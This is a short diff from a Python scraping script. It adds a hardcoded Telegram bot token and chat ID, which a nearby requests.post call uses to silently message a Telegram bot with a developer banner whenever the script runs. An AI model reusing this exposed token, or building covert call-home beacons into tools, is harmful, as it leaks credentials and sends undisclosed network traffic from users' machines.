@@ -265,6 +265,8 @@ xox = f'''⋘━━━━━━━﴾𓆩𝐕𝐈𝐏𓆪﴿━━━━━━�
 卐➺𝐌𝐑•𝐃𝐄𝐕:- @R_A_J_Y -  @K_L_D'''
 requests.post(f"https://api.telegram.org/bot{kld}/sendvideo?chat_id={sos}&video=https://t.me/GGPPE/14&caption="+str(xox))
 os.system('clear')
+kld='6583602265:AAEzXuRDE44DUPYvSG1qZOlhUh3uNU9kGR0'
+sos='6541245184'
 from bs4 import BeautifulSoup as sop
 import requests,bs4,json,os,sys,random,datetime,time,re
 import requests
